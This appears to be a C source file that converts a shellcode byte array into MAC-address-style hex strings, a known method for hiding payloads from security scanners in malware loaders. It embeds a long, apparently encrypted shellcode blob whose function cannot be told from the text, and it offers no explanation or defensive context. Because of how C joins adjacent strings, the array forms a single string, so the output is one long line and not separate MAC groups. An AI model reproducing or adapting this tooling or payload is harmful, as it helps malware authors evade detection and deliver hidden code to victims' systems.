#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void shellcode_to_mac(const char* shellcode[], size_t count) {
    for (size_t i = 0; i < count; i++) {
        const char* sc = shellcode[i];
        size_t len = strlen(sc);

        printf("\"");

        for (size_t j = 0; j < len; j += 4) { // Each shellcode byte is represented by \xHH
            // Ensure we're at the beginning of \xHH sequence
            if (sc[j] != '\\' || sc[j + 1] != 'x') {
                fprintf(stderr, "Invalid shellcode format.\n");
                return;
            }

            // Extract the hexadecimal digits
            char hex_byte[3] = { sc[j + 2], sc[j + 3], '\0' };
            unsigned int byte_value = (unsigned int)strtol(hex_byte, NULL, 16);

            // Print the byte value as a two-digit hex string
            printf("%02X", byte_value);

            // Add a colon between bytes
            if ((j + 4) < len) {
                printf(":");
            }
        }

        printf("\"\n");
    }
}

int main() {
    const char* shellcode[] = {
    "\\x56"    "\\xE3"    "\\x2F"    "\\x49"    "\\x5E"    "\\x47"
    "\\x7C"    "\\xB1"    "\\xB2"    "\\xB3"    "\\xF5"    "\\xE4"
    "\\xF7"    "\\xE7"    "\\xEA"    "\\xE8"    "\\xEC"    "\\xF3"
    "\\x8D"    "\\x6F"    "\\xDB"    "\\xF7"    "\\x4B"    "\\x93"
    "\\xA2"    "\\x8B"    "\\x4F"    "\\x97"    "\\xDE"    "\\x8F"
    "\\x43"    "\\x9B"    "\\xEA"    "\\x86"    "\\xFD"    "\\x04"
    "\\x86"    "\\xC0"    "\\x67"    "\\x9B"    "\\x98"    "\\x9B"
    "\\x5F"    "\\xA7"    "\\x86"    "\\x9F"    "\\xE9"    "\\x19"
    "\\x76"    "\\xE7"    "\\xBD"    "\\xA1"    "\\xDC"    "\\xF3"
    "\\xC0"    "\\xA0"    "\\x23"    "\\x2A"    "\\xE9"    "\\xA4"
    "\\xE7"    "\\x26"    "\\x0A"    "\\x04"    "\\xB8"    "\\xAA"
    "\\xBD"    "\\xA5"    "\\x65"    "\\xBD"    "\\xD0"    "\\x7A"
    "\\xB0"    "\\xCF"    "\\xBC"    "\\xF4"    "\\x26"    "\\x91"
    "\\x79"    "\\x81"    "\\xE2"    "\\xF0"    "\\xFE"    "\\xF2"
    "\\x7B"    "\\x8D"    "\\x00"    "\\x01"    "\\x02"    "\\x88"
    "\\x84"    "\\x8D"    "\\x06"    "\\x07"    "\\x08"    "\\x41"
    "\\x8F"    "\\xCB"    "\\x78"    "\\x6A"    "\\x46"    "\\x0E"
    "\\xC0"    "\\x41"    "\\x99"    "\\x5B"    "\\x0C"    "\\x51"
    "\\x9D"    "\\x57"    "\\x38"    "\\x50"    "\\x1B"    "\\xCB"
    "\\xFF"    "\\x4B"    "\\x53"    "\\x2E"    "\\xE9"    "\\x69"
    "\\xDD"    "\\xEA"    "\\x65"    "\\xAE"    "\\x12"    "\\xAF"
    "\\x60"    "\\x28"    "\\xFC"    "\\x63"    "\\x1D"    "\\xED"
    "\\x6F"    "\\xEE"    "\\xF9"    "\\x3C"    "\\x9E"    "\\x72"
    "\\x35"    "\\xF4"    "\\x0E"    "\\xD7"    "\\x4D"    "\\xC8"
    "\\x76"    "\\x38"    "\\x70"    "\\x19"    "\\x36"    "\\x7A"
    "\\x79"    "\\x90"    "\\x37"    "\\x9B"    "\\x1C"    "\\x01"
    "\\xCD"    "\\x07"    "\\x6C"    "\\x00"    "\\x4B"    "\\x9B"
    "\\x2A"    "\\x0C"    "\\xC5"    "\\x43"    "\\x18"    "\\x15"
    "\\xD9"    "\\x13"    "\\x48"    "\\x1C"    "\\x57"    "\\x87"
    "\\x19"    "\\xD2"    "\\x5E"    "\\xD3"    "\\x14"    "\\x5C"
    "\\x8E"    "\\x1E"    "\\x38"    "\\x20"    "\\x3A"    "\\x3D"
    "\\x3D"    "\\x3F"    "\\x27"    "\\x3F"    "\\x29"    "\\x30"
    "\\x2B"    "\\x31"    "\\x24"    "\\xEE"    "\\x82"    "\\x4F"
    "\\x31"    "\\x23"    "\\x8D"    "\\x93"    "\\x2C"    "\\x34"
    "\\x2F"    "\\x2D"    "\\x30"    "\\xF2"    "\\x68"    "\\x92"
    "\\x37"    "\\x82"    "\\x81"    "\\x80"    "\\xDD"    "\\xC8"
    "\\x3C"    "\\xF4"    "\\xF7"    "\\xB7"    "\\xD9"    "\\xB4"
    "\\xBA"    "\\x89"    "\\x8A"    "\\xCA"    "\\xDA"    "\\xC4"
    "\\x07"    "\\x69"    "\\xD8"    "\\x10"    "\\x7E"    "\\x33"
    "\\x95"    "\\x95"    "\\x96"    "\\xDE"    "\\x11"    "\\x7C"
    "\\xD3"    "\\x27"    "\\x9E"    "\\x9D"    "\\x8F"    "\\xC3"
    "\\x0C"    "\\xBB"    "\\x15"    "\\xE1"    "\\xE5"    "\\xF1"
    "\\xEF"    "\\x2E"    "\\x4C"    "\\xE5"    "\\x23"    "\\x5A"
    "\\xED"    "\\x17"    "\\xE2"    "\\xD8"    "\\x96"    "\\xB6"
    "\\x4D"    "\\x66"    "\\xF8"    "\\x3C"    "\\x5C"    "\\xDF"
    "\\xB9"    "\\xB8"    "\\xBA"    "\\xBB"    "\\xE5"    "\\xFC"
    "\\x04"    "\\x96"    "\\x40"    "\\xAA"    "\\xC2"    "\\x3C"
    "\\x11"    "\\xAF"    "\\xCC"    "\\x86"    "\\x96"    "\\x99"
    "\\x9A"    "\\x86"    "\\xFD"    "\\x04"    "\\x83"    "\\xFE"
    "\\x10"    "\\x99"    "\\x2D"    "\\x13"    "\\x9C"    "\\x5C"
    "\\x14"    "\\x9F"    "\\x27"    "\\x19"    "\\x92"    "\\x52"
    "\\x1D"    "\\x9C"    "\\x64"    "\\x35"    "\\xEF"    "\\x3E"
    "\\x02"    "\\x1C"    "\\x31"    "\\xAD"    "\\x6F"    "\\x20"
    "\\x82"    "\\xF9"    "\\xAB"    "\\xB3"    "\\xA0"    "\\x64"
    "\\x0C"    "\\xA7"    "\\x79"    "\\x08"    "\\xB3"    "\\x49"
    "\\x6D"    "\\x50"    "\\x82"    "\\x96"    "\\x07"    "\\x2C"
    "\\x7F"    "\\x3B"    "\\x88"    "\\xF7"    "\\xB7"    "\\x00"
    "\\xCE"    "\\x74"    "\\xE7"    "\\xEB"    "\\x97"    "\\x05"
    "\\x06"    "\\x07"    "\\x40"    "\\x8A"    "\\xE6"    "\\x1B"
    "\\x44"
};

    size_t count = sizeof(shellcode) / sizeof(shellcode[0]);
    shellcode_to_mac(shellcode, count);

    return 0;
}
